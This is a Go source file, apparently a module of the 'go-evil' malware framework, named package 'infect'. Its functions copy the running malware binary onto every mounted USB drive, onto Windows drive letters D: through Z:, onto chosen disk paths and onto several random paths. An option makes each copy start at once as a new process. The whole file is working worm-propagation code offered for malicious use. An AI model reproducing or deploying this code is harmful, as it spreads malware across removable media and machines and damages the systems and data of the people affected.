package infect

import (
	"fmt"
	"io"
	"os"
	"runtime"

	"github.com/s9rA16Bf4/go-evil/domains/malware"
	"github.com/s9rA16Bf4/go-evil/utility/algorithm/path"
	"github.com/s9rA16Bf4/go-evil/utility/contains"
	iio "github.com/s9rA16Bf4/go-evil/utility/io"
	"github.com/s9rA16Bf4/go-evil/utility/json"
	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Set_start_after_birth(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("infect.Set_start_after_birth()")

	data_structure.Start_malware_on_birth(true)

	return json.Send(data_structure)
}

func USB(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("infect.USB()")

	switch runtime.GOOS {
	case "linux", "darwin":
		usb_devices, err := os.ReadDir("/mnt")
		if err != nil {
			notify.Error(err.Error(), "infect.USB()")
			//return
		}
		for _, line := range usb_devices {
			data_structure = json.Receive(Disk(line.Name(), json.Send(data_structure)))
		}
	case "windows":
		driver_names := []string{"D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"}
		for _, drive := range driver_names {
			data_structure = json.Receive(Disk(drive, json.Send(data_structure)))
		}
	}
	return json.Send(data_structure)
}

func Disk(location string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("infect.Disk()")

	location = run_time.Check_if_variable(location)

	in, err := os.Open(malware.Get_malware_location() + data_structure.Get_binary_name()) // Opens the running malware
	if err != nil {
		in.Close()
		notify.Error(err.Error(), "infect.Disk()")
		//return
	}
	if !contains.EndsWith(location, []string{"/"}) {
		location += "/"
	}
	dst, err := os.Create(location + data_structure.Get_binary_name()) // Creates our target
	if err != nil {
		//return
	}
	_, err = io.Copy(dst, in)
	if err != nil {
		notify.Error(err.Error(), "infect.Disk()")
		//return
	}
	if data_structure.Get_status_start_malware_on_birth() { // Start the newly created malware
		go iio.Run_file(fmt.Sprintf("%s%s", location, data_structure.Get_binary_name())) // Spawns a new process
	}

	return json.Send(data_structure)
}
func Disk_random(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("infect.Disk_random()")

	if data_structure.Get_infect_count() == 0 { // If nothing has been set
		data_structure.Set_infect_count(5)
	}

	for i := 0; i < data_structure.Get_infect_count(); i++ {
		data_structure = json.Receive(Disk(path.Generate_random_path(3), json.Send(data_structure)))
	}

	return json.Send(data_structure)
}
